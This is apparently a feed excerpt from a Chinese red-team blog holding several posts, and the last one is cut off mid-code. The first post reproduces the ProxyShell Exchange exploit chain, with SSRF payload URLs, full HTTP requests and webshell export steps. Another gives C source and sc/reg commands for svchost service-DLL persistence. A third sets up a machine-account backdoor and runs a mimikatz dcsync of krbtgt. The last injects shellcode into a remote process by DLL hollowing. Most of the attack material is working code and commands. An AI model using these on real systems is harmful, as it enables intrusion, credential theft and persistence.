alt=""></p><p>前台服务<br><img src="https://s4.ax1x.com/2022/01/22/7WBHqx.png" alt=""></p><p>后台服务<br><img src="https://s4.ax1x.com/2022/01/22/7WDFdf.png" alt=""></p><p>444端口是system权限<br><img src="https://s4.ax1x.com/2022/01/22/7WDnQs.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7WDuyn.png" alt=""></p><h2 id="漏洞原理分析与复现"><a href="#漏洞原理分析与复现" class="headerlink" title="漏洞原理分析与复现"></a>漏洞原理分析与复现</h2><p>这次涉及到的DLL</p><pre><code>* Microsoft.Exchange.FrontEndHttpProxy.dll* Microsoft.Exchange.HttpProxy.Common.dll* Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule.dll</code></pre><p><strong>CVE-2021-34473</strong><br>Exchange主要路由是在Microsoft.Exchange.FrontEndHttpProxy.dll里的SelectHandlerForUnauthenticateRequest函数里,该函数对处理不同请求路径的服务进行处理。<br><img src="https://s4.ax1x.com/2022/01/22/7WDUyR.png" alt=""></p><p>AutodiscoverProxyRequestHandler函数实现：</p><pre><code>=&gt; 实现 EwsAutodiscoverProxyRequestHandler  =&gt; 实现 BEServerCookieProxyRequestHandler   =&gt; 实现 ProxyRequestHandler</code></pre><p><img src="https://s4.ax1x.com/2022/01/22/7WDaO1.png" alt=""></p><p>ProxyRequestHandler调用了GetTargetBackEndServerUrl函数<br><img src="https://s4.ax1x.com/2022/01/22/7WDsYD.png" alt=""></p><p>跟下去发现调用了同类里的GetClientUrlForProxy函数 (this.GetClientUrlForProxy=&gt;Microsoft.Exchange.HttpProxy.EwsAutodiscoverProxyRequestHandler.GetClientUrlForProxy())<br><img src="https://s4.ax1x.com/2022/01/22/7WDgld.png" alt=""></p><p>GetClientUrlForProxy函数调用了IsAutodiscoverV2Request检查url<br><img src="https://s4.ax1x.com/2022/01/22/7WDROI.png" alt=""></p><p>IsAutodiscoverV2Request函数，判断url路径是否存在<br><img src="https://s4.ax1x.com/2022/01/22/7WDXmq.png" alt=""></p><p>回到GetTargetBackEndServerUrl，调用RemoveExplicitLogonFromUrlAbsoluteUri函数。传入了个this.explicitLogonAddress参数。跟踪这个参数被谁赋值了。调用了 ResolveAnchorMailbox函数，请求Email参数的值赋予（无论是：GET、POST、COOKIE都可以）<br><img src="https://s4.ax1x.com/2022/01/22/7Wric9.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7WrK9e.png" alt=""></p><p>回到ResolveAnchorMailbox函数，如果请求路径中存在于Email参数中，则进行url截取<br><img src="https://s4.ax1x.com/2022/01/22/7WrljA.png" alt=""></p><p>没截取前<br><img src="https://s4.ax1x.com/2022/01/22/7WrGHP.png" alt=""></p><p>截取后<br><img src="https://s4.ax1x.com/2022/01/22/7Wra9g.png" alt=""></p><p>回到ProxyRequestHandler函数继续往下跟踪，设置port为444端口<br><img src="https://s4.ax1x.com/2022/01/22/7Wr0js.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7WrrBq.png" alt=""></p><p>继续动态跟踪下去时，发现到了BeginProxyRequest函数里，去到CreateServerRequest函数。跟入后发现WebRequest初始化传入url。在往下面后就是发送请求然后获取响应<br><img src="https://s4.ax1x.com/2022/01/22/7WrsH0.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7Wrg4U.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7Wrhv9.png" alt=""></p><p>最后结出上面的规则为：</p><pre><code>* url路径必须带有/autodiscover/autodiscover.json或者/autodiscover/autodiscover.json/V1.0* Email参数 带有url路径会被进行截断（Email参数在GET、POST、COOKIE请求都可以）* 最后修改port为444，进行请求获取响应</code></pre><p>payload</p><pre><code>https://100.100.5.217/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&amp;Email=autodiscover/autodiscover.json%3f@foo.com</code></pre><p>出现以下页面则代表存在SSRF漏洞 (SYSTEM权限令牌绕过登录)<br><img src="https://s4.ax1x.com/2022/01/22/7WrXgH.png" alt=""></p><p>直接访问/mapi/nspi/是需要登录的<br><img src="https://s4.ax1x.com/2022/01/22/7Wrjvd.png" alt=""></p><p>利用exchange的autodiscover服务来查找高权限用户的配置文件，我们需要配置文件中的legacyDn属性，这个属性可以帮助我们得到目标用户的sid，如果能得到目标用户sid，我们就可以拥有目标用户的权限来使用ews的api进行恶意炒作例如监听其他用户的邮件。</p><pre><code>POST /autodiscover/autodiscover.json?@foo.com/autodiscover/autodiscover.xml?=&amp;Email=autodiscover/autodiscover.json%3f@foo.com HTTP/1.1Host: 100.100.5.217Connection: closeCache-Control: max-age=0sec-ch-ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;96&quot;, &quot;Google Chrome&quot;;v=&quot;96&quot;sec-ch-ua-mobile: ?0sec-ch-ua-platform: &quot;Windows&quot;DNT: 1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PrivateComputer=true; PBack=0; ClientId=2A9DC075E72B49ED95FAF9498FFD63AE; UC=d7662cac28fe41f5a4c752c0cb96f36f; X-OWA-JS-PSD=1; ASP.NET_SessionId=097f8699-5d46-4849-914f-08bcefbf727c; TimeOffset=-480; Eac_CmdletLogging=false; OutlookSession=d4443a26257741528c97c97f1b718e88; mkt=zh-CN; X-OWA-CANARY=XsK-HxTO_E-jYGE_d3TOoxAwaR2929kIrct9DGPb_7Yh46fL8Zwh9sYZrYS7XO0EM_7_veA6Vtw.Content-Type: text/xmlContent-Length: 370&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;        &lt;Request&gt;          &lt;EMailAddress&gt;administrator@yayi.local&lt;/EMailAddress&gt;          &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;        &lt;/Request&gt;    &lt;/Autodiscover&gt;</code></pre><p><img src="https://s4.ax1x.com/2022/01/22/7Ws9VP.png" alt=""></p><p>用legacyDn属性值请求获取对应用户的SID (利用接口报错获得的SID，需要在legacyDn后面加不可见字符串，具体建议看脚本抓包)</p><pre><code>POST //autodiscover/autodiscover.json?a=mpoak@ldxzf.rgq/mapi/emsmdb HTTP/1.1Host: 192.168.1.106Accept-Encoding: gzip, deflateCookie: Email=autodiscover/autodiscover.json?a=mpoak@ldxzf.rgqX-Requesttype: ConnectX-Clientinfo: {2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}X-Clientapplication: Outlook/15.0.4815.1002X-Requestid: {C715155F-2BE8-44E0-BD34-2960067874C8}:2Content-Type: application/mapi-httpContent-Length: 141Connection: close/o=yayimail/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=36252da5ce5d4b7cbee9eda07b45ab16-pentest</code></pre><p><img src="https://s4.ax1x.com/2022/01/22/7WsZKs.png" alt=""></p><p>根据CVE-2018-8581我们可以知道，如果我们知道某个用户的sid，那么我们就可以模拟这个用户使用SOAP通过ews的api进行各种操作，例如监听其他用户的邮件。但这是远远不够的。我们可以尝试访问Exchange PowerShell Remoting进行RCE攻击。</p><p><strong>CVE-2021-34523分析</strong><br>Exchange PowerShell Remoting是一个基于WSMan协议的一个服务，他可以执行一些特定的powershell命令，实现的功能有发邮件、读邮件、更新配置文件等，使用的前提是使用者需具有邮箱，可是如果我们利用前面的ssrf漏洞来使用system用户的身份使用此服务的话就会失败，原因是system用户是没有邮箱的。因此我们需要解决一个认证问题，使得我们可以以高权限用户的身份去使用这个服务，进而进行后续操作。</p><p>这时候我们有几个难点：</p><pre><code>* 无法通过设置X-CommonAccessToken间接设置CommonAccessToken来伪造自己的身份，因为有黑名单的存在，因此exchange无法通过ssrf将X-CommonAccessToken的值带给backend，因此无法通过这种方法进行身份验证。（没研究为什么）* 想要通过认证必须传递正确的CommonAccessToken给Backend。* 即使我们找到了一个可传递的点，但我们到底传递什么样的CommonAccessToken才能使得exchange 的backend认为我们是高权限用户呢？</code></pre><p>在Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule.dll，有个RemotePowershellBackendCmdletProxyModule函数。有一个用户可控的输入点，这个输入点输入的数据最终会变成CommonAccessToken的值<br><img src="https://s4.ax1x.com/2022/01/22/7WsJM9.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7Ws0PO.png" alt=""></p><p>CommonAccessToken.Deserialize函数是解密从X-Rps-CAT参数传入的值<br><img src="https://s4.ax1x.com/2022/01/22/7WscqI.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7WsTMj.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7WsHLn.png" alt=""></p><p>网上的文章都有在这里断点然后查看内存（我这没跟）<br><img src="https://i.bmp.ovh/imgs/2022/01/4488c69909dba75c.png" alt=""></p><p>加密必须有的:</p><pre><code>1. 用户名2. 用户sid，推荐Administrator，即使域环境禁用了管理员用户administrator，仍然能够认证成功3. group sid，可随便指定一个例如S-1-1-04. 最终将得到的值进行base64加密后即可作为payload使用</code></pre><p><strong>CVE-2021-31207</strong><br>在实现认证后，利用New-MailboxExportRequest导出邮件getshell。在导出之前需要利用SSRF调用接口去发送邮件<br>（这里有个问题，邮件内容都是用PKT加密的，导出的webshell也是PKT加密的。需要自己加解密）<br>参考微软:<a href="https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-pst/5faf4800-645d-49d1-9457-2ac40eb467bd)%E3%80%82" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-pst/5faf4800-645d-49d1-9457-2ac40eb467bd)%E3%80%82</a><br><img src="https://i.bmp.ovh/imgs/2022/01/c560a6b9aff01afa.png" alt=""></p><p><strong>复现过程</strong><br>利用过程</p><pre><code>1. SSRF获取legacyDn2. SSRF获取用户SID3. SSRF往指定用户发邮件4. 构造CommonAccessToken访问powershell接口，利用New-MailboxExportRequest导出webshell</code></pre><p>这里有个问题是，如何构造xml向目标powershell接口发送。pypsrp可以实现利用winrm调用powershell，发送的数据也是xml的。但是如何通过将xml数据发送？<br><img src="https://i.bmp.ovh/imgs/2022/01/0fb9c8f9a09cda06.png" alt=""></p><p>利用脚本的思路是开个httpserver重写class解决<br><img src="https://i.bmp.ovh/imgs/2022/01/18063e240f8c8237.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/01/8f88ab63c62a325f.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/01/1ddf5b731b3a169b.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/01/bb1c6c13d1e5ce2b.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/" target="_blank" rel="noopener">https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/</a><br><a href="https://www.anquanke.com/post/id/251713#h2-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/251713#h2-4</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/120037619" target="_blank" rel="noopener">https://blog.csdn.net/qq_41874930/article/details/120037619</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这周复现了proxyshell这个漏洞，一直嫌麻烦没弄。跟dll跟了两天终于弄明白了&lt;/p&gt;
&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://jiushill.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>svchost.exe挂载DLL</title>
    <link href="http://jiushill.github.io/posts/3047149d.html"/>
    <id>http://jiushill.github.io/posts/3047149d.html</id>
    <published>2022-01-15T17:28:39.000Z</published>
    <updated>2022-01-15T17:36:01.766Z</updated>
    
    <content type="html"><![CDATA[<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p><img src="https://s4.ax1x.com/2022/01/16/7YH6o9.png" alt=""></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>vs新建类库编译个处理服务循环响用的DLL</p><pre><code>#include &quot;pch.h&quot;#define SVCNAME TEXT(&quot;EvilSvc&quot;)SERVICE_STATUS serviceStatus;SERVICE_STATUS_HANDLE serviceStatusHandle;HANDLE stopEvent = NULL;VOID UpdateServiceStatus(DWORD currentState){    serviceStatus.dwCurrentState = currentState;    SetServiceStatus(serviceStatusHandle, &amp;serviceStatus);}DWORD ServiceHandler(DWORD controlCode, DWORD eventType, LPVOID eventData, LPVOID context){    switch (controlCode)    {        case SERVICE_CONTROL_STOP:            serviceStatus.dwCurrentState = SERVICE_STOPPED;            SetEvent(stopEvent);            break;        case SERVICE_CONTROL_SHUTDOWN:            serviceStatus.dwCurrentState = SERVICE_STOPPED;            SetEvent(stopEvent);            break;        case SERVICE_CONTROL_PAUSE:            serviceStatus.dwCurrentState = SERVICE_PAUSED;            break;        case SERVICE_CONTROL_CONTINUE:            serviceStatus.dwCurrentState = SERVICE_RUNNING;            break;        case SERVICE_CONTROL_INTERROGATE:            break;        default:            break;    }    UpdateServiceStatus(SERVICE_RUNNING);    return NO_ERROR;}VOID ExecuteServiceCode(){    stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);    UpdateServiceStatus(SERVICE_RUNNING);    // #####################################    // your persistence code here    // #####################################    while (1)    {        WaitForSingleObject(stopEvent, INFINITE);        UpdateServiceStatus(SERVICE_STOPPED);        return;    }}extern &quot;C&quot; __declspec(dllexport) VOID WINAPI ServiceMain(DWORD argC, LPWSTR * argV){    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME, (LPHANDLER_FUNCTION)ServiceHandler);    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;    serviceStatus.dwServiceSpecificExitCode = 0;    UpdateServiceStatus(SERVICE_START_PENDING);    ExecuteServiceCode();}</code></pre><p>创建EvilSvc服务</p><pre><code>sc.exe create EvilSvc binPath= &quot;c:\windows\System32\svchost.exe -k DcomLaunch&quot; type= share start= auto</code></pre><p>修改EvilSvc DLL路径为自己的DLL路径</p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\Windows\system32\EvilSvc.dll /f</code></pre><p>注册表查看该服务如下<br><img src="https://s4.ax1x.com/2022/01/16/7YHWz6.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/01/16/7YH4sO.png" alt=""></p><p>修改svchost组里的DcomLaunch<br>（添加创建的服务名）<br><img src="https://s4.ax1x.com/2022/01/16/7YH5LD.png" alt=""></p><p>启动EvilSvc服务</p><pre><code>sc start EvilSvc</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHoee.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/01/16/7YH7od.png" alt=""></p><p>检测技术</p><pre><code>* 最近创建的服务svchost.exe作为binPath* 列出所有系统服务的ServiceDLL值并检测</code></pre><pre><code>Get-ItemProperty hklm:\SYSTEM\ControlSet001\Services\*\Parameters | ? { $_.servicedll } | select psparentpath, servicedll</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHXSP.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;工作原理&quot;&gt;&lt;a href=&quot;#工作原理&quot; class=&quot;headerlink&quot; title=&quot;工作原理&quot;&gt;&lt;/a&gt;工作原理&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://s4.ax1x.com/2022/01/16/7YH6o9.png&quot; alt=&quot;&quot;&gt;&lt;/</summary>
      
    
    
    
    
    <category term="红队" scheme="http://jiushill.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>userAccountControl将ID设置为8192作为后门</title>
    <link href="http://jiushill.github.io/posts/a984f0cd.html"/>
    <id>http://jiushill.github.io/posts/a984f0cd.html</id>
    <published>2022-01-15T17:02:29.000Z</published>
    <updated>2022-01-15T17:25:17.889Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>来源推特：<br><img src="https://s4.ax1x.com/2022/01/16/7YTx9P.png" alt=""></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>YAYI.local - Windows Server 2012 - DC<br>YAYI.local - Windows 7 - 域机器(WIN-BMIO66D4K15)</p><p>在域控机器执行</p><pre><code>powershell下运行如果要在非DC下执行需要执行命令:Import-Module Microsoft.ActiveDirectory.Management.dll #导入Microsoft.ActiveDirectory.Management.dll#添加机器账户New-ADComputer -Name ATTACKER10 -AccountPassword (ConvertTo-SecureString -String &quot;Hjk123456!&quot; -Force -AsPlainText)#设置机器账户的userAccountControl (需要域管权限)$ADComputer=Get-ADComputer -Identity ATTACKER10Set-ADObject -Identity $ADComputer -Replace @{userAccountControl=8192}#查询域DC机器Get-ADGroupMember -Identity &quot;Domain Controllers&quot;</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHPxK.png" alt=""></p><p>域内机器执行dcsync dump</p><pre><code>(需要等待几分钟)mimikatz:lsadump::dcsync /user:krbtgt</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHeIA.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/16/7YHlM8.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;来源推特：&lt;br&gt;&lt;img src=&quot;https://s4.ax1x.com/2022/01/16/7YTx9P.png&quot; alt=&quot;&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://jiushill.github.io/tags/域渗透/"/>
    
  </entry>
  
  <entry>
    <title>DLL镂空不使用Loadlibrary</title>
    <link href="http://jiushill.github.io/posts/c34749bd.html"/>
    <id>http://jiushill.github.io/posts/c34749bd.html</id>
    <published>2022-01-15T16:41:30.000Z</published>
    <updated>2022-01-15T16:56:12.191Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>被几个吊毛同事催着更博客，立刻更了一篇 (</p><h2 id="利用NtMapViewOfSection来加载DLL"><a href="#利用NtMapViewOfSection来加载DLL" class="headerlink" title="利用NtMapViewOfSection来加载DLL"></a>利用NtMapViewOfSection来加载DLL</h2><p>看到一遍文章，利用NtMapViewOfSection来加载DLL。不使用LoadLibrary来加载DLL复现了一下<br>NtMapViewOfSection，之前复现过NtCreateSection + NtMapViewOfSection 代码注入。当时没有好好的看NtMapViewOfSection这个API函数。顺便记录一下<br>ZwCreateSection</p><pre><code>NTSYSAPI NTSTATUS ZwCreateSection(  [out]          PHANDLE            SectionHandle,  [in]           ACCESS_MASK        DesiredAccess,  [in, optional] POBJECT_ATTRIBUTES ObjectAttributes,  [in, optional] PLARGE_INTEGER     MaximumSize,  [in]           ULONG              SectionPageProtection,  [in]           ULONG              AllocationAttributes,  [in, optional] HANDLE             FileHandle);</code></pre><p>ZwMapViewOfSection</p><pre><code>NTSYSAPI NTSTATUS ZwMapViewOfSection(  [in]                HANDLE          SectionHandle,  [in]                HANDLE          ProcessHandle,  [in, out]           PVOID           *BaseAddress,  [in]                ULONG_PTR       ZeroBits,  [in]                SIZE_T          CommitSize,  [in, out, optional] PLARGE_INTEGER  SectionOffset,  [in, out]           PSIZE_T         ViewSize,  [in]                SECTION_INHERIT InheritDisposition,  [in]                ULONG           AllocationType,  [in]                ULONG           Win32Protect);</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YIWDJ.png" alt=""></p><p>NtMapViewOfSection可以共享进程之间的内存。类似于下图<br><img src="https://s4.ax1x.com/2022/01/16/7YIfb9.png" alt=""></p><p>文章里的介绍<br><img src="https://s4.ax1x.com/2022/01/16/7YI4ER.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/01/16/7YII4x.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/01/16/7YIbvD.png" alt=""></p><p>Demo1<br>利用tMapViewOfSection代替VirtualAllocEx和WriteProcessMemory，将要Load的DLL路径写入远程的进程</p><pre><code class="C">// demo.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;Windows.h&gt;#include &lt;iostream&gt;#include &lt;psapi.h&gt;#pragma comment(lib, &quot;ntdll&quot;)#define errorprint(name){printf(&quot;%s Error Code:%d\n&quot;,GetLastError());}typedef struct _LSA_UNICODE_STRING { USHORT Length;  USHORT MaximumLength; PWSTR  Buffer;  } UNICODE_STRING, * PUNICODE_STRING;typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING   ObjectName; ULONG Attributes; PVOID SecurityDescriptor;     PVOID   SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, *  PCLIENT_ID;using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG   DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER   MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE   FileHandle OPTIONAL);using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle,  PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,  PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN   PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG   StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID   StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID   ClientID);myNtCreateSection fNtCreateSection =  (myNtCreateSection)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtCreateSection&quot;));myNtMapViewOfSection fNtMapViewOfSection =  (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtMapViewOfSection&quot;));myRtlCreateUserThread fRtlCreateUserThread =  (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;RtlCreateUserThread&quot;));unsigned char buf[] =&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;&quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;&quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;&quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;&quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;&quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;&quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;&quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;&quot;\x63\x2e\x65\x78\x65\x00&quot;;int main(){    HANDLE sectionHandle = NULL;    PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;    SIZE_T size = 4096;    INT PID = 23164;    LARGE_INTEGER sectionSize = { size };    TCHAR moduleName[] = L&quot;C:\\Windows\\System32\\xwreg.dll&quot;;    HMODULE hmodules[MAX_PATH] = {};    DWORD hmodulesize = sizeof(hmodules);    DWORD hmodulesizeneeded = 0;    HMODULE rmodule = NULL;    CHAR rmoduleName[MAX_PATH] = {};    fNtCreateSection(&amp;sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE |  SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&amp;sectionSize, PAGE_EXECUTE_READWRITE,  SEC_COMMIT, NULL);    fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &amp;localSectionAddress, NULL,  NULL, NULL, &amp;size, 2, NULL, PAGE_READWRITE);    printf(&quot;LocalAddress:0x%x\n&quot;, localSectionAddress);    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, PID);    if (hprocess == NULL) {        errorprint(&quot;OpenProcess&quot;);    }    fNtMapViewOfSection(sectionHandle, hprocess, &amp;remoteSectionAddress, NULL, NULL, NULL,  &amp;size, 2, NULL, PAGE_READWRITE);    printf(&quot;remoteSectionAddress:0x%x\n&quot;, remoteSectionAddress);    memcpy(localSectionAddress, moduleName, sizeof(moduleName));    PTHREAD_START_ROUTINE loadaddress =  (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA(&quot;Kernel32&quot;), &quot;LoadLibraryW&quot;);    printf(&quot;LoadLibraryA Address:0x%x\n&quot;, loadaddress);    HANDLE dllThread = CreateRemoteThread(hprocess, NULL, 0, loadaddress,  remoteSectionAddress, 0, NULL); //远程线程调用LoadlibraryW函数加载xwreg.dll    WaitForSingleObject(dllThread, 1000); //休眠10秒    EnumProcessModules(hprocess, hmodules, hmodulesize, &amp;hmodulesizeneeded); //获取进程加载的所有模块句柄数量    for (int calc = 0; calc &lt; (hmodulesizeneeded / sizeof(HMODULE)); calc++) {        rmodule = hmodules[calc];        GetModuleBaseNameA(hprocess, rmodule, rmoduleName, sizeof(rmoduleName)); //获取模块名称        if (strcmp(rmoduleName, &quot;xwreg.dll&quot;) == 0) {            break;        }    }    printf(&quot;%s %x\n&quot;, rmoduleName, rmodule);    DWORD headerbuffersize = 0x1000;    LPVOID peHeader = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerbuffersize);    ReadProcessMemory(hprocess, rmodule, peHeader, headerbuffersize, NULL); //读取dll pe地址    PIMAGE_DOS_HEADER dosheader = (PIMAGE_DOS_HEADER)peHeader; //dll DOS头    PIMAGE_NT_HEADERS ntheader = (PIMAGE_NT_HEADERS)((DWORD_PTR)peHeader +  dosheader-&gt;e_lfanew); //dll BaseAddress+文件相对偏移地址=ntaddress    LPVOID dllEntryPoint = (LPVOID)(ntheader-&gt;OptionalHeader.AddressOfEntryPoint +  (DWORD_PTR)rmodule); //入口点指针地址+指定dll基地址=模块入口点    WriteProcessMemory(hprocess, dllEntryPoint, (LPVOID)buf, sizeof(buf), NULL); //写入shellcode    CreateRemoteThread(hprocess, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint,  NULL, 0, NULL); //远程线程启动    return 0;}</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YIODH.png" alt=""></p><p>Demo2<br>利用tMapViewOfSection代替LoadLibrary加载DLL</p><pre><code class="C">// demo.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;Windows.h&gt;#include &lt;iostream&gt;#include &lt;psapi.h&gt;#include &lt;tlhelp32.h&gt;#pragma comment(lib, &quot;ntdll&quot;)#define errorprint(name){printf(&quot;%s Error Code:%d\n&quot;,GetLastError());}#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)typedef struct _LSA_UNICODE_STRING { USHORT Length;  USHORT MaximumLength; PWSTR  Buffer;  } UNICODE_STRING, * PUNICODE_STRING;typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING   ObjectName; ULONG Attributes; PVOID SecurityDescriptor;     PVOID   SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID 